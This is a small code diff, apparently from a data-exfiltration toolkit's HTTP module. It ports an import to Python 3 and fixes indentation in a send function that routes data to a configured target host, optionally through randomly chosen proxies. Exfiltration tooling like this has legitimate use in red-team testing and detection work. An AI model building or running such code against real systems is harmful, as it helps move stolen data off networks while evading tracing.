@@ -1,7 +1,7 @@
 from __future__ import print_function
 import requests
 import base64
-from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+from http.server import BaseHTTPRequestHandler, HTTPServer
 import urllib
 from random import choice
 import platform
@@ -72,7 +72,7 @@ class S(BaseHTTPRequestHandler):
 def send(data):
     if config.has_key('proxies') and config['proxies'] != [""]:
         targets = [config['target']] + config['proxies']
-    	target = "http://{}:{}".format(choice(targets), config['port'])
+        target = "http://{}:{}".format(choice(targets), config['port'])
     else:
     	target = "http://{}:{}".format(config['target'], config['port'])
     app_exfiltrate.log_message(
